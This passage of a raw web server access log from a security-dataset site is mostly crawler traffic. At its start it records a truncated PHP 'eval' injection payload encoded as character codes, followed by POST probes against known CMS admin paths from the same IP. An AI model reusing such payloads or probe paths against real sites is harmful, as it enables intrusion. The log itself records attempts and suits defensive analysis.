63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:10 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 328 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:10 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 305 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
51.222.253.12 - - [22/Oct/2021:12:30:43 -0700] "GET /self.logs/access.log.2017-06-01.gz HTTP/1.1" 200 19756 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.20.116 - - [22/Oct/2021:12:31:16 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
198.137.18.195 - - [22/Oct/2021:12:41:19 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:12:41:19 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:12:41:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:12:41:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:12:41:21 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
49.7.20.116 - - [22/Oct/2021:12:44:33 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
198.137.18.195 - - [22/Oct/2021:13:02:10 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:13:02:10 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
198.137.18.195 - - [22/Oct/2021:13:02:18 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
49.7.20.116 - - [22/Oct/2021:13:04:37 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.128 - - [22/Oct/2021:13:23:34 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.116 - - [22/Oct/2021:13:26:37 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
74.125.212.152 - - [22/Oct/2021:13:35:51 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
64.233.172.96 - - [22/Oct/2021:13:35:51 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
64.233.172.125 - - [22/Oct/2021:13:35:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
157.55.39.50 - - [22/Oct/2021:13:41:43 -0700] "GET /self.logs/error.log.2020-02-20 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
58.17.6.9 - - [22/Oct/2021:13:41:56 -0700] "GET / HTTP/1.1" 200 13149 "-" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.5.2.1188 (SpeedMode; Proxy; Android 5.0.2; HTC_Desire_601_dual_sim ) U2/1.0.0 Mobile" 
51.222.253.10 - - [22/Oct/2021:13:42:16 -0700] "GET /Datasets%20Description/PE_malware/?C=D;O=D HTTP/1.1" 200 639 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
101.132.129.91 - - [22/Oct/2021:13:42:37 -0700] "GET /js/comment.css HTTP/1.1" 404 328 "http://www.secrepo.com/js/comment.css" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
86.133.23.74 - - [22/Oct/2021:13:43:55 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 5749920 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15" 
49.7.20.116 - - [22/Oct/2021:13:49:32 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
51.222.253.10 - - [22/Oct/2021:13:53:58 -0700] "GET /self.logs/access.log.2021-10-03.gz HTTP/1.1" 200 10344 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.13 - - [22/Oct/2021:13:55:51 -0700] "GET /self.logs/error.log.2021-10-03.gz HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
86.133.23.74 - - [22/Oct/2021:13:45:44 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 547221542 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15" 
51.222.253.11 - - [22/Oct/2021:13:57:48 -0700] "GET /self.logs/access.log.2021-10-04.gz HTTP/1.1" 200 12992 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
207.46.13.95 - - [22/Oct/2021:13:58:42 -0700] "GET /self.logs/access.log.2021-03-16.gz HTTP/1.1" 200 18856 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.222.253.17 - - [22/Oct/2021:13:59:49 -0700] "GET /self.logs/error.log.2021-10-04.gz HTTP/1.1" 200 1987 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.9 - - [22/Oct/2021:14:01:46 -0700] "GET /self.logs/access.log.2017-03-08.gz HTTP/1.1" 200 18021 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.16 - - [22/Oct/2021:14:03:41 -0700] "GET /self.logs/access.log.2018-03-27.gz HTTP/1.1" 200 37349 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.18 - - [22/Oct/2021:14:05:46 -0700] "GET /self.logs/error.log.2019-05-19.gz HTTP/1.1" 200 8837 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.4 - - [22/Oct/2021:14:07:40 -0700] "GET /self.logs/error.log.2020-07-17 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.20.116 - - [22/Oct/2021:14:10:31 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
51.222.253.8 - - [22/Oct/2021:14:11:32 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1417 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.19 - - [22/Oct/2021:14:13:30 -0700] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1324 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.20 - - [22/Oct/2021:14:15:23 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1607 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.8 - - [22/Oct/2021:14:17:19 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 78840 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.14 - - [22/Oct/2021:14:19:38 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
203.186.4.114 - - [22/Oct/2021:14:21:53 -0700] "HEAD / HTTP/1.1" 200 388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36; Dragonbot; http://www.dragonmetrics.com" 
220.181.108.161 - - [22/Oct/2021:14:23:42 -0700] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 8847868 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
49.7.20.128 - - [22/Oct/2021:14:24:14 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.116 - - [22/Oct/2021:14:31:31 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.249.88.108 - - [22/Oct/2021:14:36:22 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.88.137 - - [22/Oct/2021:14:36:22 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.88.143 - - [22/Oct/2021:14:36:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
178.63.69.12 - - [22/Oct/2021:14:36:27 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)" 
178.63.69.12 - - [22/Oct/2021:14:36:28 -0700] "GET / HTTP/1.1" 200 49089 "-" "Mozilla/5.0 (compatible; Birdcrawlerbot/0.5; +https://crawla.de)" 
157.55.39.50 - - [22/Oct/2021:14:48:29 -0700] "GET /self.logs/error.log.2021-03-22 HTTP/1.1" 301 535 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.116 - - [22/Oct/2021:14:53:36 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
3.87.54.88 - - [22/Oct/2021:14:58:06 -0700] "GET / HTTP/1.1" 206 13234 "-" "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" 
3.237.39.86 - - [22/Oct/2021:14:58:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Slackbot 1.0 (+https://api.slack.com/robots)" 
54.75.99.80 - - [22/Oct/2021:15:00:14 -0700] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0" 
54.75.99.80 - - [22/Oct/2021:15:00:15 -0700] "GET / HTTP/1.1" 200 13149 "http://66.33.221.139" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0" 
128.199.13.166 - - [22/Oct/2021:15:12:35 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
128.199.13.166 - - [22/Oct/2021:15:12:36 -0700] "GET / HTTP/1.0" 200 49096 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
49.7.20.116 - - [22/Oct/2021:15:14:36 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.21.67.71 - - [22/Oct/2021:15:20:17 -0700] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 304 265 "-" "Java/1.6.0_24" 
49.7.20.128 - - [22/Oct/2021:15:23:48 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
95.163.255.57 - - [22/Oct/2021:15:26:31 -0700] "GET /robots.txt HTTP/1.0" 200 340 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.52 - - [22/Oct/2021:15:26:36 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dns.html HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
51.222.253.7 - - [22/Oct/2021:15:35:47 -0700] "GET /Datasets%20Description/?C=D;O=D HTTP/1.1" 200 629 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.20.116 - - [22/Oct/2021:15:36:50 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
24.144.22.33 - - [22/Oct/2021:15:43:33 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1" 
157.90.181.151 - - [22/Oct/2021:15:46:48 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:46:48 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:46:48 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 677 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:46:55 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=D;O=A HTTP/1.1" 200 834 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:46:59 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=M;O=A HTTP/1.1" 200 834 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:03 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=N;O=D HTTP/1.1" 200 833 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1" 200 827 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:12 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/app_stats.html HTTP/1.1" 200 1591 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:15 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/conn.html HTTP/1.1" 200 2011 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:18 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dhcp.html HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:21 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dns.html HTTP/1.1" 200 1837 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:24 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dpd.html HTTP/1.1" 200 1664 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:29 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/files.html HTTP/1.1" 200 1918 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:33 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ftp.html HTTP/1.1" 200 1765 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:36 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/http.html HTTP/1.1" 200 2034 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:39 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/irc.html HTTP/1.1" 200 1781 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:42 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html HTTP/1.1" 200 1543 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:46 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/notice.html HTTP/1.1" 200 2001 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:50 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/packet_filter.html HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:54 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ssl.html HTTP/1.1" 200 1860 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:47:57 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/weird.html HTTP/1.1" 200 1937 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:04 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=D;O=A HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=A HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:11 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=N;O=D HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:14 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=S;O=A HTTP/1.1" 200 824 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:17 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/app_stats.html HTTP/1.1" 200 1590 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:20 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/conn.html HTTP/1.1" 200 2006 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:23 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dhcp.html HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:28 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dns.html HTTP/1.1" 200 1831 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:31 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dpd.html HTTP/1.1" 200 1655 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:34 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/files.html HTTP/1.1" 200 1910 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:39 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ftp.html HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:42 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/http.html HTTP/1.1" 200 2032 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:45 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/irc.html HTTP/1.1" 200 1771 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:50 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html HTTP/1.1" 200 1543 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:53 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/notice.html HTTP/1.1" 200 2006 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:48:59 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/packet_filter.html HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:02 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ssl.html HTTP/1.1" 200 1860 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:05 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/weird.html HTTP/1.1" 200 1935 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=D;O=A HTTP/1.1" 200 823 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=M;O=A HTTP/1.1" 200 823 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:20 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=N;O=D HTTP/1.1" 200 822 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:23 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=S;O=A HTTP/1.1" 200 818 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:27 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/app_stats.html HTTP/1.1" 200 1591 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:30 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/conn.html HTTP/1.1" 200 2009 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:34 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dhcp.html HTTP/1.1" 200 1740 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:38 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dns.html HTTP/1.1" 200 1830 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:42 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dpd.html HTTP/1.1" 200 1662 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:46 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/files.html HTTP/1.1" 200 1910 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:52 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/http.html HTTP/1.1" 200 2035 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:49:58 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/irc.html HTTP/1.1" 200 1784 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:02 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html HTTP/1.1" 200 1543 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:06 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/notice.html HTTP/1.1" 200 2002 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:09 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/packet_filter.html HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ssl.html HTTP/1.1" 200 1874 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:19 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/weird.html HTTP/1.1" 200 1931 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:50:22 -0700] "GET /Datasets%20Description/Network/N/A HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
